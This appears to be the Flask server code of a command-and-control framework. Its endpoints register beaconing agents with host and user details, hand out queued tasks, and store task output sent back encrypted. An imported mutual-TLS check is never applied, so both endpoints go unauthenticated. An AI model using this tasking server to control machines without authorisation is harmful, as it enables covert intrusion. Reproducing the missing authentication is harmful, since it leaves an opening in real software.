import json
from flask import Blueprint, request, jsonify

from database import get_db
from middleware.auth import require_mtls
from services.crypto import decrypt_data

beacon_bp = Blueprint("beacon", __name__)


@beacon_bp.route("/beacon", methods=["POST"])

def beacon():
    encrypted    = request.json.get("data")
    beacon_info  = json.loads(decrypt_data(encrypted))
    agent_id     = beacon_info.get("id")

    db = get_db()
    db.execute("""
        INSERT INTO agents (id, hostname, user, os, ip, last_seen,agent_group)
        VALUES (?, ?, ?, ?, ?, datetime('now'),?)
        ON CONFLICT(id) DO UPDATE SET
            hostname  = excluded.hostname,
            user      = excluded.user,
            os        = excluded.os,
            ip        = excluded.ip,
            last_seen = datetime('now'),
            agent_group = excluded.agent_group
    """, (
        agent_id,
        beacon_info.get("hostname"),
        beacon_info.get("user"),
        beacon_info.get("os"),
        request.remote_addr,
        beacon_info.get("agent_group"),
    ))
    db.commit()

    tasks = db.execute("""
        SELECT uuid, task_json, scheduled_at FROM tasks
        WHERE agent_id = ? AND output IS NULL
    """, (agent_id,)).fetchall()

    if tasks:
        return [
            {"task": json.loads(t["task_json"]), "uuid": t["uuid"],
             "scheduled_at": t["scheduled_at"]}
            for t in tasks
        ]
    return []

MAX_PAYLOAD_SIZE = 10 * 1024 * 1024

@beacon_bp.route("/result", methods=["POST"])
def result():
    # 1. Validate Content-Length header before parsing the body
    content_length = request.content_length
    if content_length and content_length > MAX_PAYLOAD_SIZE:
        return jsonify({"error": "Payload too large"}), 413

    # 2. Safely parse JSON data
    encrypted = request.json.get("data")
    if not encrypted:
        return jsonify({"error": "Missing data"}), 400

    result_info = json.loads(decrypt_data(encrypted))

    # 3. (Optional) Validate the specific 'output' field size after decryption
    output_data = result_info.get("output")
    if output_data and len(str(output_data)) > MAX_PAYLOAD_SIZE:
        return jsonify({"error": "Output data exceeds limit"}), 413

    db = get_db()
    db.execute("""
        UPDATE tasks SET output = ?, executed_at = ? WHERE uuid = ?
    """, (output_data, result_info.get("executed_at"), result_info.get("uuid")))
    db.commit()

    return jsonify({"status": "received"})